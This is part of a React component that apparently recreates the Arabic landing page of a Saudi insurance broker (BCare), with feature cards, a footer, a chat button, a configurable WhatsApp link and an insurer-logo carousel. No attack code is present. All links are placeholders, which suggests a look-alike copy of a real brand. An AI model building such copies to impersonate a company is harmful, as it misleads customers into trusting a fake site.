              <div className="w-10 h-10 md:w-12 md:h-12 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/f5.svg" alt="هب ريح" className="w-8 h-8 md:w-10 md:h-10" />
              </div>
              <h3 className="font-bold mb-2 md:mb-3 text-sm md:text-xl" style={{ color: '#146494' }}>هب ريح</h3>
              <p className="text-xs md:text-lg leading-relaxed" style={{ color: '#146494' }}>نربط وثيقتك في أسرع وقت مع نظام المرور ونجم</p>
            </div>
            <div className="bg-white px-2 md:px-3 py-6 md:py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-10 h-10 md:w-12 md:h-12 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/f6.svg" alt="خصومات تضبطك" className="w-8 h-8 md:w-10 md:h-10" />
              </div>
              <h3 className="font-bold mb-2 md:mb-3 text-sm md:text-xl" style={{ color: '#146494' }}>خصومات تضبطك</h3>
              <p className="text-xs md:text-lg leading-relaxed" style={{ color: '#146494' }}>خصومات لبعض القطاعات الحكومية وشبه الحكومية والخاصة</p>
            </div>
            <div className="bg-white px-2 md:px-3 py-6 md:py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-10 h-10 md:w-12 md:h-12 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/f7.svg" alt="منافع تحميك" className="w-8 h-8 md:w-10 md:h-10" />
              </div>
              <h3 className="font-bold mb-2 md:mb-3 text-sm md:text-xl" style={{ color: '#146494' }}>منافع تحميك</h3>
              <p className="text-xs md:text-lg leading-relaxed" style={{ color: '#146494' }}>خطط تأمين متنوعة مع المرونة في تحديد المنافع الإضافية اللي تناسبك</p>
            </div>
            <div className="bg-white px-2 md:px-3 py-6 md:py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-10 h-10 md:w-12 md:h-12 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/f8.svg" alt="مكان واحد" className="w-8 h-8 md:w-10 md:h-10" />
              </div>
              <h3 className="font-bold mb-2 md:mb-3 text-sm md:text-xl" style={{ color: '#146494' }}>مكان واحد</h3>
              <p className="text-xs md:text-lg leading-relaxed" style={{ color: '#146494' }}>تدير كل وثائقك إدارة إلكترونية كاملة من مكان واحد وتجددها في أي وقت</p>
            </div>
          </div>
        </div>
      </section>

      {/* Why BCare Section */}
      <section className="py-8 md:py-16 bg-white">
        <div className="container mx-auto px-4 lg:px-8">
          <h2 className="text-xl md:text-3xl font-bold text-center mb-8 md:mb-14" style={{ color: primaryBlue }}>
            ليش بي كير خيارك الأول في التأمين؟
          </h2>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-x-8 md:gap-x-28 gap-y-8 md:gap-y-16 max-w-5xl mx-auto">
            <div className="text-center">
              <div className="w-12 h-12 md:w-16 md:h-16 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/g5.svg" alt="منك وفيك" className="w-10 h-10 md:w-12 md:h-12" />
              </div>
              <h3 className="font-bold text-sm md:text-lg" style={{ color: '#146494' }}>منك وفيك</h3>
            </div>
            <div className="text-center">
              <div className="w-12 h-12 md:w-16 md:h-16 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/g6.svg" alt="عروض تفهمك" className="w-10 h-10 md:w-12 md:h-12" />
              </div>
              <h3 className="font-bold text-sm md:text-lg" style={{ color: '#146494' }}>عروض تفهمك</h3>
            </div>
            <div className="text-center">
              <div className="w-12 h-12 md:w-16 md:h-16 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/g8.svg" alt="سعر يرضيك" className="w-10 h-10 md:w-12 md:h-12" />
              </div>
              <h3 className="font-bold text-sm md:text-lg" style={{ color: '#146494' }}>سعر يرضيك</h3>
            </div>
            <div className="text-center">
              <div className="w-12 h-12 md:w-16 md:h-16 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/g4.svg" alt="إصدار سريع" className="w-10 h-10 md:w-12 md:h-12" />
              </div>
              <h3 className="font-bold text-sm md:text-lg" style={{ color: '#146494' }}>إصدار سريع</h3>
            </div>
            <div className="text-center">
              <div className="w-12 h-12 md:w-16 md:h-16 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/g9.svg" alt="نقّسط تأمينك" className="w-10 h-10 md:w-12 md:h-12" />
              </div>
              <h3 className="font-bold text-sm md:text-lg" style={{ color: '#146494' }}>نقّسط تأمينك</h3>
            </div>
            <div className="text-center">
              <div className="w-12 h-12 md:w-16 md:h-16 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/g7.svg" alt="نفزع لك" className="w-10 h-10 md:w-12 md:h-12" />
              </div>
              <h3 className="font-bold text-sm md:text-lg" style={{ color: '#146494' }}>نفزع لك</h3>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="text-white pt-8 md:pt-12 pb-6" style={{ backgroundColor: footerDark }}>
        <div className="container mx-auto px-4 lg:px-8">
          {/* Top Section - ORIGINAL desktop layout restored */}
          <div className="flex flex-col md:flex-row gap-6 mb-8">
            {/* Right side: Logo + Phone + Stores + Payment */}
            <div className="flex flex-col md:flex-row gap-6 md:items-start">
              {/* BCare Logo + Phone */}
              <div className="text-right flex-shrink-0">
                <img src="/images/a1/l1.svg" alt="بي كير" className="h-10 mb-3 brightness-0 invert" />
                <p className="text-white text-lg font-bold mb-3" dir="ltr">☎ 8001180044</p>
                {/* Payment Methods */}
                <img src="/images/a1/g2.svg" alt="طرق الدفع" className="h-8 mt-3" />
              </div>
              {/* App Stores stacked on desktop, row on mobile */}
              <div className="flex flex-row md:flex-col gap-2 flex-shrink-0">
                <img src="/images/a1/s2.svg" alt="Google Play" className="h-9 md:h-10 w-fit" />
                <img src="/images/a1/s1.svg" alt="App Store" className="h-9 md:h-10 w-fit" />
                <img src="/images/a1/s3.svg" alt="AppGallery" className="h-9 md:h-10 w-fit" />
              </div>
            </div>

            {/* 4 Text Columns */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-6 flex-1">
              {/* عن بي كير */}
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">عن بي كير</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">خصومات وريف</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">سياسة الخصوصية</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">الشروط والأحكام</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">وظائف</a></li>
                </ul>
              </div>

              {/* منتجاتنا */}
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">منتجاتنا</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">تأمين المركبات</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">التأمين الطبي</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين السفر</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين الأخطاء الطبية</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين العمالة المنزلية</a></li>
                </ul>
              </div>

              {/* الدعم الفني */}
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">الدعم الفني</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">المدونة</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">إلغاء وثيقتك</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">رفع تذكرة</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">اطبع وثيقتك</a></li>
                </ul>
              </div>

              {/* روابط مهمة */}
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">روابط مهمة</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">هيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">طريقة رفع شكوى لهيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">قواعد ولوائح هيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">شهادة ضريبة القيمة المضافة</a></li>
                </ul>
              </div>
            </div>
          </div>

          {/* Bottom: white line, social icons left, copyright right */}
          <div className="border-t border-white/30 md:border-white pt-4 flex flex-col-reverse md:flex-row items-center justify-between gap-3 md:gap-0">
            {/* Copyright - Left */}
            <p className="text-[10px] md:text-sm text-white/80 text-center md:text-right mb-0 md:mb-0">
              2026 © جميع الحقوق محفوظة، شركة عناية الوسيط لوساطة التأمين
            </p>
            {/* Social Icons - Right */}
            <div className="flex gap-2 md:gap-3">
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
              </a>
              <a href={whatsappNumber ? `https://wa.me/${whatsappNumber.replace(/\D/g, '')}` : '#'} target="_blank" rel="noopener noreferrer" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-[#25D366] transition-colors duration-300">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
              </a>
            </div>
          </div>
        </div>
      </footer>

      {/* Floating Contact Button */}
      <div className="fixed bottom-20 left-4 z-50" dir="ltr">
        <button onClick={() => openAmerChat()} className="group flex items-center h-12 md:h-14 rounded-full shadow-lg overflow-hidden transition-all duration-500 ease-in-out" style={{ backgroundColor: '#f5a623', width: '3rem' }}
          onMouseEnter={(e) => { if (window.innerWidth >= 768) { (e.currentTarget as HTMLElement).style.width = '10rem'; } }}
          onMouseLeave={(e) => { if (window.innerWidth >= 768) { (e.currentTarget as HTMLElement).style.width = '3rem'; } }}
          onTouchStart={(e) => { 
            const el = e.currentTarget as HTMLElement;
            if (el.style.width === '10rem') {
              openAmerChat();
            } else {
              el.style.width = '10rem';
              setTimeout(() => { el.style.width = '3rem'; }, 3000);
            }
          }}
        >
          <div className="flex-shrink-0 w-12 h-12 md:w-14 md:h-14 flex items-center justify-center">
            <svg className="w-6 h-6 md:w-7 md:h-7 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1c-4.97 0-9 3.58-9 8v3.5c0 1.38 1.12 2.5 2.5 2.5H7V9c0-2.76 2.24-5 5-5s5 2.24 5 5v6h1.5c1.38 0 2.5-1.12 2.5-2.5V9c0-4.42-4.03-8-9-8zm-2 15h-2v-4h2v4zm8 0h-2v-4h2v4z"/><path d="M7.5 18.5v1c0 1.38 1.12 2.5 2.5 2.5h4c1.38 0 2.5-1.12 2.5-2.5v-1"/></svg>
          </div>
          <span className="text-white font-bold text-sm md:text-base whitespace-nowrap pr-3 md:pr-4 opacity-0 group-hover:opacity-100 transition-opacity duration-300 delay-200">راسلنا</span>
        </button>
      </div>

      {/* Scroll to Top */}
      <div className="fixed bottom-4 left-4 z-50">
        <button 
          onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
          className="w-9 h-9 md:w-10 md:h-10 rounded-full shadow-lg flex items-center justify-center text-white" 
          style={{ backgroundColor: primaryBlue }}
        >
          <svg className="w-4 h-4 md:w-5 md:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 10l7-7m0 0l7 7m-7-7v18" />
          </svg>
        </button>
      </div>
    </div>
  );
}


function InsuranceLogosCarousel() {
  const logos = [
    { src: "/images/a1/c2.svg", alt: "التعاونية" },
    { src: "/images/a1/c1.svg", alt: "الراجحي" },
    { src: "/images/a1/c6.svg", alt: "ميدغلف" },
    { src: "/images/a1/c12.svg", alt: "GIG" },
    { src: "/images/a1/c9.svg", alt: "أليانز" },
    { src: "/images/a1/c7.svg", alt: "ACIG" },
    { src: "/images/a1/c10.svg", alt: "أمانة" },
    { src: "/images/a1/c11.svg", alt: "الدرع العربي" },
    { src: "/images/a1/c14.svg", alt: "UCA" },
    { src: "/images/a1/c8.svg", alt: "الجزيرة تكافل" },
    { src: "/images/a1/c4.svg", alt: "الصقر" },
    { src: "/images/a1/c17.svg", alt: "ملاذ" },
    { src: "/images/a1/c5.svg", alt: "سلامة" },
    { src: "/images/a1/c3.svg", alt: "ولاء" },
    { src: "/images/a1/c15.svg", alt: "AICC" },
    { src: "/images/a1/c16.svg", alt: "أكسا" },
    { src: "/images/a1/c13.svg", alt: "TUIC" },
  ];

  const [currentIndex, setCurrentIndex] = useState(0);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth < 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Create extended array for seamless looping
  const extendedLogos = [...logos, ...logos, ...logos];

  const startAutoPlay = useCallback(() => {
    if (timerRef.current) clearInterval(timerRef.current);
    timerRef.current = setInterval(() => {
      setIsTransitioning(true);
      setCurrentIndex(prev => prev + 1);
    }, 2500);
  }, []);

  useEffect(() => {
    startAutoPlay();
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [startAutoPlay]);

  // Reset position seamlessly when we've scrolled through one full set
  useEffect(() => {
    if (currentIndex >= logos.length) {
      const timeout = setTimeout(() => {
        setIsTransitioning(false);
        setCurrentIndex(currentIndex - logos.length);
      }, 500);
      return () => clearTimeout(timeout);
    }
  }, [currentIndex, logos.length]);

  const handlePrev = () => {
    setIsTransitioning(true);
    setCurrentIndex(prev => prev + 1);
    startAutoPlay();
  };

  const itemWidth = isMobile ? 100 : 180;
  const gap = isMobile ? 16 : 32;
  const offset = currentIndex * (itemWidth + gap);

  return (
    <div className="flex items-center flex-1 min-w-0 mt-3 md:mt-0" dir="ltr" style={{ overflow: 'hidden' }}>
      <button
        onClick={handlePrev}
        className="flex-shrink-0 w-7 h-7 md:w-8 md:h-8 rounded-full bg-gray-50 shadow flex items-center justify-center text-[#146494] hover:bg-gray-100 ml-2 md:ml-3"
      >
        <svg className="w-4 h-4 md:w-5 md:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M15 19l-7-7 7-7" />
        </svg>
      </button>
      <div className="overflow-hidden flex-1">
        <div
          className="flex items-center"
          style={{
            gap: `${gap}px`,
            transform: `translateX(-${offset}px)`,
            transition: isTransitioning ? 'transform 0.5s ease-in-out' : 'none',
          }}
        >
          {extendedLogos.map((logo, i) => (
            <div key={i} className="flex-shrink-0 flex items-center justify-center" style={{ width: `${itemWidth}px`, height: isMobile ? '36px' : '48px' }}>
              <img src={logo.src} alt={logo.alt} className="max-h-8 md:max-h-12 max-w-full object-contain" />
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
